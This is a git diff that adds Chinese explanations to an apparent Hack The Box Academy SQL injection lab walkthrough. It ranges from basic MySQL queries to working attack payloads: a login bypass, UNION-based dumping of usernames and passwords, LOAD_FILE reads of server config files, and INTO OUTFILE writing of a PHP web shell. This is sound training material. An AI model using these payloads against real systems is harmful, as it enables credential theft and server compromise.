@@ -134,23 +134,37 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 
 ### 题目 1：Intro to MySQL
 
+使用命令行，输入 `mysql -u root -h <IP> -P <Port> -p` 并输入密码来连接数据库。再根据题目要求输入 `SHOW DATABASES;`，可以查看到第一个数据库是 `employees`。
+
 ![](img/1-1.png)
 
 ![](img/1-ans.png)
 
 ### 题目 2：SQL Statements
 
+连接数据库并查看所有数据库，用 `USE` 选择要查看的数据库，使用 `SHOW TABLES;` 查看该数据库中的所有表格，找到 `departments` 表。使用 `SELECT * FROM departments` 语句查看该表中所有数据，发现当 `dept‌_name = 'Development'` 时，对应的 `dept‌_no = 'd005'`。
+
 ![](img/2-1.png)
+
+使用 `WHERE` 子句也可以直接查看 `dept‌_name = 'Development'` 时，对应的 `dept‌_no` 的内容： `SELECT * FROM departments WHERE dept_name = 'Development'`
+
+![](img/2-2.png)
 
 ![](img/2-ans.png)
 
 ### 题目 3：Query Results
 
+找出 `employees` 表的方法同上。使用 `LIMIT` 子句查看列名称（`DESCRIBE employees;` 也行）。在 `SELECT` 语句中使用 `LIKE` 过滤匹配项，用通配符 `%` 来查询以 `Bar` 开头的字段，用 `AND` 来连接两个搜索条件：`SELECT * FROM employees WHERE first_name LIKE "Bar%" AND hire_date = '1990-01-01';`
+
 ![](img/3-1.png)
+
+![](img/3-2.png)
 
 ![](img/3-ans.png)
 
 ### 题目 4：SQL Operators
+
+找到表和列名称、查询匹配要求的记录的方法同上。使用 `COUNT()` 函数来对查询到的记录计数：`SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE ‘%engineer%’;`
 
 ![](img/4-1.png)
 
@@ -160,6 +174,8 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 
 ### 题目 5：Subverting Query Logic
 
+尝试登入并查看网页提供的 SQL 查询，根据该查询语句，使用 `tom' or '1'='1` 作为注入载荷，这里 `'1'='1` 与原查询语句中第二个引号配对，先和 `password` 语句进行与运算，得到的结果再和 `username='tom'` 进行或运算，由于 `tom` 在表中存在，所以结果为真，认证就会成功。
+
 ![](img/5-1.png)
 
 ![](img/5-2.png)
@@ -167,6 +183,8 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 ![](img/5-ans.png)
 
 ### 题目 6：Using Comments
+
+OR 运算符的认证绕过方法同上一题，注意用 `)` 配对 SQL 查询语句中的左括号。在注入载荷最后添加注释符 `-- ` 或 `#` 或 `%23` 来注释掉后面的语句。
 
 ![](img/6-1.png)
 
@@ -176,13 +194,21 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 
 ### 题目 7：Union Clause
 
+查看两个表的列名称，使用 `UNION` 语句进行联合查询即可。
+
 ![](img/7-1.png)
 
 ![](img/7-2.png)
 
+同样可以使用 `COUNT()` 函数来得到记录数：`SELECT count(dept_no) FROM departments UNION SELECT count(emp_no) FROM employees;`
+
+![](img/7-3.png)
+
 ![](img/7-ans.png)
 
 ### 题目 8：Union Injection
+
+先联合 `SELECT 1,2,3,4-- ` 来同时探测出表的列数和实际显示的列（`ORDER BY` 也行）。在能被显示的列使用 `user()` 函数来返回当前用户名和主机名。
 
 ![](img/8-1.png)
 
@@ -191,6 +217,15 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 ![](img/8-ans.png)
 
 ### 题目 9：Database Enumeration
+
+仿照教程依次注入如下载荷，可获取所有用户的用户名和密码。
+
+```sqL
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+' UNION select 1, username, password, 4 from ilfreight.users-- -
+```
 
 ![](img/9-1.png)
 
@@ -208,6 +243,10 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 
 可以推知，使用了 `include` 命令。在 [Another Example](https://academy.hackthebox.com/module/33/section/792) 中讲到，在 `/search.php` 中尝试查看 `/var/www/html/search.php`，在网页源代码中会展示该文件的全部 PHP 代码。因此只需在网页源代码中查找一下 `include` 命令，就可以找到定义 `$conn` 的文件了。
 
+仿照教程注入 `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`，查看网页源代码，搜索 `include` 即可找到使用 PHP `include` 命令的位置，可知 `$conn` 在 `config.php` 当中。
+
+`config.php` 所在目录是 `/var/www/html/`。注入 `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -` 即可查看 `$conn` 所有内容，找出数据库密码。
+
 ![](img/10-1.png)
 
 ![](img/10-3.png)
@@ -220,11 +259,20 @@ cn' UNION SELECT "",'<?php system("dir /var"); ?>', "", "", "" into outfile '/va
 
 ### 题目 11：Writing Files
 
+注入 `<?php system(pwd); ?>` 并写入到 `/var/www/html/shell1.php` 当中，在 URL 中添加该 Web Shell 文件名并添加 `?id=0`，访问并运行 Web Shell。可通过上述方法使用 `pwd` 命令，查看到当前浏览的文件所在的目录。
+
+```SQL
+cn' union select "",'<?php system(pwd); ?>', "", "" into outfile '/var/www/html/shell1.php'-- -
+-- URL: <IP>:<Port>/shell1.php?id=0
+```
+
+同上，使用 `dir` 命令查看每一层目录下的所有文件和目录，最后可以在 `/var/www` 目录下找到 `flag.txt`。最后使用 `cat` 命令查看该文件即可。
+
+---
+
 1. 输入 `cn' union select "",'<?php system(dir); ?>', "", "" into outfile '/var/www/html/shell1.php'-- -`
    打开 `<SERVER_IP>:<PORT>/shell1.php?id=0`
    发现当前目录为 `/var/www/html`。
-
-![](img/11-1.png)
 
 ![](img/11-2.png)
 
